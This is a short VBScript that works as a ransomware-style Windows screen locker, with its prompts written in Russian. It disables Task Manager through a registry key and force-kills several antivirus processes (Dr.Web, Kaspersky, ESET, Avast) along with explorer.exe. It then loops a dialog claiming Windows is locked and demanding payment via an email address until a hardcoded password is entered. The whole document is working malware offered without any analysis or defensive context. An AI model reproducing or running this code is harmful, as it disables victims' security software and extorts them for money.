On Error Resume Next
set x = createobject ("wscript.shell")
set t = createobject ("wscript.shell")
x.run"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1"
x.run"taskkill /f /im drwebengine.exe "
x.run"taskkill /f /im avp.exe"
x.run"taskkill /f /im egui.exe"
x.run"taskkill /f /im ekrn.exe"
x.run"taskkill /f /im AvastSvc.exe"
x.run"TASKKILL /F /IM explorer.exe"
do
t=inputbox("Windows заблокирован! Введите пароль! Для оплаты oooaokgi@yandex.ru")
if t="3512351235123512" then
set z = createobject("wscript.shell")
z.run"explorer.exe"
z.run"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr"
exit do
else
msgbox"Неправильный пароль!",16,"X@aKeR"
end if
loop
